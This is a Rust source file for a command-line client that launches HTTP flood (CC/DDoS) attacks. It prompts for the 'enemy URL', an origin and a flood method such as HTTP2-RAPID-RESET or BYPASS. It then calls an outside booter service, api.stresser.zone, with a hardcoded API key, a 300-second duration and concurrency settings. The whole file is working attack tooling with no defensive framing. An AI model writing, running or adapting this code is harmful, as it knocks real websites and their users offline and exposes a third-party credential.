use std::io;
use colored::Colorize;
use crate::fuck;
extern crate url;
use url::Url;

pub fn ccattack() {
    println!("cc攻击");
    println!("输入敌方URL");
    let mut hurl = String::new();
    io::stdin()
        .read_line(&mut hurl)
        .expect("Failed to read line");
    println!("输入轰炸来源");
    let mut origin = String::new();
    io::stdin()
        .read_line(&mut origin)
        .expect("Failed to read line");

    let fuck = ["HTTP1-RAW",
        "HTTP2-RAW",
        "HTTP-REQUEST",
        "TLS",
        "HEADLESS-BROWSER",
        "BYPASS",
        "HTTP2-RAPID-RESET",
        "STORM"];
    let sb = fuck::fuck(fuck);



    println!("{sb}");

    println!("输入轰炸mode");
    let mut mode = String::new();
    io::stdin()
        .read_line(&mut mode)
        .expect("Failed to read line");
    println!(
        "{} {} {} {}",
        hurl,
        origin,
        sb,
        mode.green()
    );

    let base_url = "https://api.stresser.zone/start";
    let mut url = Url::parse(base_url).unwrap();

    url.query_pairs_mut().append_pair("type", "7");
    url.query_pairs_mut().append_pair("apikey", "7BUE5YGAS0TW1VC");
    url.query_pairs_mut().append_pair("host", hurl.trim());
    url.query_pairs_mut().append_pair("origin", origin.trim());
    url.query_pairs_mut().append_pair("time", "300");
    url.query_pairs_mut().append_pair("method", sb.trim());
    url.query_pairs_mut().append_pair("mode", mode.trim());
    url.query_pairs_mut().append_pair("cookies", "");
    url.query_pairs_mut().append_pair("reqperip", "128");
    url.query_pairs_mut().append_pair("concurrents", "3");

    println!("{}", url);


    let body = reqwest::blocking::get(url).unwrap().text().unwrap();

    println!("body = {body:?}");
}
